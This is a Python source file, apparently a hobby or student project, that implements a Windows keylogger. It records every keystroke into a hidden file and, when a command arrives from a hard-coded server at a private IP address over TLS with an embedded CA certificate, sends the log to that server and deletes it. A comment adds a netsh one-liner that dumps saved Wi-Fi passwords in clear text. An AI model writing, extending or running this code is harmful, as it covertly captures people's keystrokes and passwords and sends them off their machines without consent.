import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUY8ROzBPJBwp576O94AoGV8a06B8wDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCRlIxCzAJBgNVBAgMAjc4MSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjExMDEyNDEwWhcNMjUwMjEwMDEyNDEw
WjA9MQswCQYDVQQGEwJGUjELMAkGA1UECAwCNzgxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
ANDhONY+qAaTOr2idHG83BJzKdXdZE97+UWZV4dWQHBU4htbYwC7qwkph+4OgnuW
ueI0HzhNZ/SzFhB6s+Jjq2ZiDLlymqMAhtJbp4b9wwlUknAKqbnyEzpNRvfJmMH8
EFJBO2syPON//cwUP2B0TW/qUkOPIS4UgF/0dvPTxJNyDcImLPkT5XpuV3rupBuR
QmjxVWlHk1LFjATxBVrbuz43zG9CYKrdPByL+TP25pLVvrn3iyvrt9YrKLyQGjpc
527A5ND1uC5nV8q3E2qGtcToR4yzUgbr+Bxv+3bJwejU1kPZoGTlAG/aJDQffFnQ
eRZuFUE+DwU4lEGhbz4+G0keiNT7P78U0P07vy8XdDOrlGYUSvePPDa1Jaqw2Cfz
F3Ztw7llOrxlMYy86Qf3h8Wq6gcYJXDCpShuSIBYmUbrIlWU7lHGOGO9ZzD49ZAp
tjaKcf0M6J9M3HJQcxlsc4ytalkLrU2QRoRAe06YoO4f9ZmC5OBRXBqwbeOqC3Kk
+59akELmHxX0xJvJH9zrUHpP90+FlOL1iOEtt84C4hJjgKPf8s7FfhMXL8U7o1PI
wB30d/ECPxDnIT8scf06xpA4KlG35dGLVyUeu3JYQRJpM2HBMlpLzh5F/riSF7Ah
xzSGmls6yrX/E87jI8yf0/iTWs7rWFG0vXFMTwZN4S4zAgMBAAGjUzBRMB0GA1Ud
DgQWBBTAUljpDCLgLEh//PRhlw858PvEtjAfBgNVHSMEGDAWgBTAUljpDCLgLEh/
/PRhlw858PvEtjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQC/
DrxfPTrX6PODT45EwysBdpQzS6Tbf8E7Yg9mVjjaeLfyMIj270z7CwjYpZIuD9x2
ilidAAAuhEjPTAu+EBW1AMECsQtSLqoZEMhGxGttJYmc922cVkk2jyj5W+B4ebY7
BTAYSaIGJhLeKvPS7Wk0QNzPidDp/V/lsOZjR+KgxKZl/cVrU2K/6o9FPxSj6eod
XsU1wiCkDEf67RmRnNNQ8eUe8qndymUsisaJuPU95eILzSUSjGKGagOVIOFbuFb2
r80NNQBa+5b/Nxxg2GZZbAeiarbdFxUJBrmnSLY5ksvCjkFLAa1BNqRqWzL+5wRi
bUB45qpJxvfoYART8SAmTg9oDeHPKe9vz44sypi0fIEHmZE0791k1H9SMlHOfnpn
WQtu1kmFi3TV2ottMIH+aXEClL6DVX3PFFRkzWwFk1hkjAFCVZmkyhMDL7Izi3Un
rXncUEDz7Wd3qhtyzRuIlnLSYeajpOnjdTvsa8SXlBpVGGkJ32YdudbGTjqzewv/
N7rD0d1NvpsmTW69Z2nq5evm53ATcMYGJZ78bSoev7GIyM5ZYiUXNtJaZuRVwNrc
9bzp/m87dXr4H/6MyXAwzDdFHDnZKMX51tl4HhGO95gnPplvrcomxZviAMkvz5JK
HirglciRoVLCfCGZmlRiTGHDZVtdSpSJvwF9vyKHdw==
-----END CERTIFICATE-----
"""

# for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
def check_platform():
    return platform.system()

def find_ca_cert_path():
    for r, d, f in os.walk("c:\\"): 
        for files in f:
            if files == "ca-cert.pem":
                path = os.path.join(r, files)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path  
    return None 
    
def os_check():
        current_platform = check_platform()
        if current_platform == 'Windows':
            #print('Windows')
            return 'Windows'
        elif current_platform == 'Linux':
            #print('Linux')
            return 'Linux'   
        else:
            return None

def send_file(conn, filename):
    try:
        with open(filename, 'rb') as f:
            while True:
                chunk = f.read(1024)  # Lire un chunk du fichier
                print(f"chunk {chunk}")
                if not chunk:
                    break  # Si le chunk est vide, on a atteint la fin du fichier
                conn.sendall(chunk)  # Envoyer le chunk au client
    finally:
        # Fermer le fichier
        f.close()
        os.remove(filename)

def key_logger(path_hidden_file, client_ssl):
    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    os.system(f"attrib +h {path_hidden_file}")  # Rendre le fichier caché

    def on_press(key):
        logging.info(str(key))

    # Crée un écouteur de clavier pour enregistrer les touches
    with Listener(on_press=on_press) as listener:
        # Crée un thread pour écouter les messages du serveur
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()

        # Attend que le thread du serveur se termine
        server_listener_thread.join()

        # Une fois le thread du serveur terminé, on arrête le keylogger
        listener.stop()
        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)


def main():
    print('main active')
    os_local = os_check()
    print(os_local)
    if os_local == 'Windows':
        #print("Wait until the programme find the certificate file on your device ...")
        #ca_cert_path = find_ca_cert_path()
        #print(ca_cert_path)
        #script_dir = os.path.dirname(os.path.realpath(__file__))
        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
        #print("CA cert path:", ca_cert_path)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cadata=CA_CERTIFICATE)

        # Setting
        host = '192.168.1.43' #remplacer par l'ip du serveur
        port = 90
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Secure the socket
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
    #bien ou quoi
        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)
                    
                    #exit(1)
                    #print("-- END --")
                    #client_ssl.close()
                
            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else : 
        print("linux in maintenance")

if __name__ == "__main__":
    main()
